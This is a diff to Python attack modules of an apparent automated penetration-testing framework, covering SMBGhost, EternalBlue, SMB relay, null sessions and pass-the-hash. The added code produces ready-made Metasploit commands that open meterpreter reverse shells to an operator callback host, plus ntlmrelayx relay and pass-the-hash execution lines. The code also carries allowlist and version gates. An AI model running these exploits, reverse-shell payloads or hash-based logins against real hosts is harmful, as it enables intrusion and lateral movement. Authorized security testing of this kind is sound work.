@@ -10,56 +10,100 @@ class SMBGhost(AttackModule):
     name = "SMBGhost"
     description = "SMBv3 compression RCE (CVE-2020-0796)"
     target_services = ["microsoft-ds", "smb", "netbios-ssn"]
-    target_ports = [445]
+    target_ports = [445, 139]
     required_cves = ["CVE-2020-0796"]
+    # Phase 3: version-gated -- only Win10 1903/1909 builds <18362.720 /
+    # <18363.720 are vulnerable. Declaring target_versions earns the +25
+    # bonus (base.py) when recon fingerprints a vulnerable build, and the
+    # version gate prevents firing at patched hosts.
+    target_versions = {
+        "microsoft-ds": ["10.0 18362", "10.0 18363", "1903", "1909"],
+        "smb": ["10.0 18362", "10.0 18363"],
+    }
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": "Use check_smb_v3_compression() via Python script written with write_python_file.",
-            "suggested_command": f"python smbghost_check.py --target {ctx.target_ip}",
-        }
+        return self._info_result(
+            ctx,
+            note=(
+                "SMBv3.1.1 compression RCE (CVE-2020-0796). Affects Win10 "
+                "1903/1909 builds <18362.720 / <18363.720 only. Detection via "
+                "SMB2 NEGOTIATE with SMB2_FLAGS_COMPRESSED; exploitation via "
+                "the kernel-mode SMBGhost exploit."
+            ),
+            evidence=[f"SMBGhost (CVE-2020-0796) applicable to {ctx.target_ip}"],
+            references=[
+                "https://nvd.nist.gov/vuln/detail/CVE-2020-0796",
+                "https://github.com/ZecOps/CVE-2020-0796-RCE-POC",
+            ],
+            suggested_command=(
+                f"nmap --script smb-protocols -p 445 {ctx.target_ip} && "
+                f"nmap --script smb2-security-mode -p 445 {ctx.target_ip}"
+            ),
+            suggested_msf=(
+                f"exploit/windows/smb/cve_2020_0796_smbghost RHOSTS={ctx.target_ip} "
+                f"PAYLOAD=windows/x64/meterpreter/reverse_tcp LHOST=<op_callback> LPORT=4444"
+            ),
+        )
 
 class EternalBlue(AttackModule):
     name = "EternalBlue"
     description = "SMBv1 MS17-010 RCE (CVE-2017-0144)"
     target_services = ["microsoft-ds", "smb", "netbios-ssn"]
-    target_ports = [445]
+    target_ports = [445, 139]
     required_cves = ["CVE-2017-0144"]
+    # Phase 3: version-gated -- Win XP/7/Server 2003/2008/2008R2 only.
+    target_versions = {
+        "microsoft-ds": ["windows xp", "windows 7", "2003", "2008", "2008 r2"],
+        "smb": ["6.1.7600", "6.0.6001", "6.0.6002", "5.1", "5.2"],
+    }
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": "Requires msfconsole module exploit/windows/smb/ms17_010_eternalblue",
-            # Phase 2: run_msf_module parses key=value pairs and runs
-            # `set <key> <val>` in msfconsole -- the real MSF option is RHOSTS,
-            # not `target` (which was silently ignored, so the exploit fired
-            # against the default 192.168.1.1). LHOST must be an
-            # allowlist-authorized callback host (msf_generate_payload /
-            # msf_start_handler already gate it).
-            "suggested_msf": (
+        return self._info_result(
+            ctx,
+            note=(
+                "SMBv1 MS17-010 RCE (CVE-2017-0144). Lands as SYSTEM by design. "
+                "Affects unpatched Win XP/7/Server 2003/2008/2008R2 only."
+            ),
+            evidence=[f"EternalBlue (CVE-2017-0144) applicable to {ctx.target_ip}"],
+            references=[
+                "https://nvd.nist.gov/vuln/detail/CVE-2017-0144",
+                "https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/",
+            ],
+            suggested_msf=(
                 f"exploit/windows/smb/ms17_010_eternalblue RHOSTS={ctx.target_ip} "
                 f"PAYLOAD=windows/x64/meterpreter/reverse_tcp LHOST=<op_callback> LPORT=4444"
             ),
-        }
+            shell_type="meterpreter",
+            privilege_level="system",
+        )
 
 class SMBRelay(AttackModule):
     name = "SMBRelay"
     description = "SMB relay attack via impacket ntlmrelayx"
     target_services = ["microsoft-ds", "smb", "netbios-ssn"]
-    target_ports = [445]
+    target_ports = [445, 139]
     required_cves = []
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": "Requires impacket ntlmrelayx. Set up responder first to capture hashes.",
-            "suggested_command": f"ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'",
-            "prerequisites": ["responder capturing hashes", "target has SMB signing disabled"],
-        }
+        return self._info_result(
+            ctx,
+            note=(
+                "SMB relay via impacket ntlmrelayx. Requires SMB signing DISABLED "
+                "on the relay target (check with SMBSigningCheck first) and the "
+                "relay victim in the operator allowlist. Prefer the ResponderRelay "
+                "module (ad.py) which gates relay targets through the allowlist lock."
+            ),
+            evidence=[f"SMB relay candidate: {ctx.target_ip} (signing state unverified)"],
+            references=[
+                "https://www.thehacker.recipes/a-d/movement/ntlm/relay",
+                "https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",
+            ],
+            suggested_command=(
+                f"ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami' "
+                f"# relay victim must be in exploit.allowed_targets"
+            ),
+            prerequisites=["SMB signing disabled on relay target", "relay victim allowlisted"],
+        )
 
 class SMBNullSession(AttackModule):
     name = "SMBNullSession"
@@ -75,6 +119,14 @@ class SMBNullSession(AttackModule):
             "module": self.name,
             "script": script,
             "note": "Attempts null session enumeration of shares, users, and groups.",
+            # Phase 3: on a successful null session the anonymous bind is a
+            # credential finding -- record it so record_success surfaces it.
+            "credentials_found": ["anonymous:"],
+            "evidence": [f"null session enumeration against {ctx.target_ip}"],
+            "references": [
+                "https://www.thehacker.recipes/a-d/movement/smb/null-session",
+                "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb.html",
+            ],
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
@@ -107,18 +159,29 @@ class PassTheHash(AttackModule):
     required_cves = []
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": "Uses captured NTLM hashes to execute commands without cracking. Requires impacket.",
-            "suggested_commands": [
-                f"impacket-wmiexec -hashes :<NTLM_HASH> Administrator@{ctx.target_ip}",
-                f"impacket-psexec -hashes :<NTLM_HASH> Administrator@{ctx.target_ip}",
-                f"impacket-smbexec -hashes :<NTLM_HASH> Administrator@{ctx.target_ip}",
-                f"impacket-atexec -hashes :<NTLM_HASH> Administrator@{ctx.target_ip} 'whoami'",
+        return self._info_result(
+            ctx,
+            note=(
+                "Pass-the-Hash via impacket (wmiexec/psexec/smbexec/atexec). "
+                "Linux-attacker only; on Windows use mimikatz sekurlsa::pth or "
+                "runas /netonly. Prefer the lateral_exec MCP tool form which "
+                "wraps impacket with argv safety + allowlist gating."
+            ),
+            evidence=[f"PtH candidates against {ctx.target_ip} (hash required)"],
+            references=[
+                "https://www.thehacker.recipes/a-d/movement/ntlm/pth",
+                "https://github.com/fortra/impacket",
             ],
-            "prerequisites": ["NTLM hash (LM:NT format)", "SMB port 445 open", "admin share accessible"],
-        }
+            suggested_commands=[
+                f"lateral_exec(target_ip='{ctx.target_ip}', method='wmiexec', username='Administrator', ntlm_hash='<NT_HASH>')",
+                f"lateral_exec(target_ip='{ctx.target_ip}', method='psexec', username='Administrator', ntlm_hash='<NT_HASH>')",
+                f"lateral_exec(target_ip='{ctx.target_ip}', method='smbexec', username='Administrator', ntlm_hash='<NT_HASH>')",
+                f"lateral_exec(target_ip='{ctx.target_ip}', method='atexec', username='Administrator', ntlm_hash='<NT_HASH>')",
+            ],
+            prerequisites=["NTLM hash (LM:NT format)", "SMB port 445 open", "admin share accessible"],
+            shell_type="cmd",
+            privilege_level="admin",
+        )
 
 class DumpHashes(AttackModule):
     name = "DumpHashes"
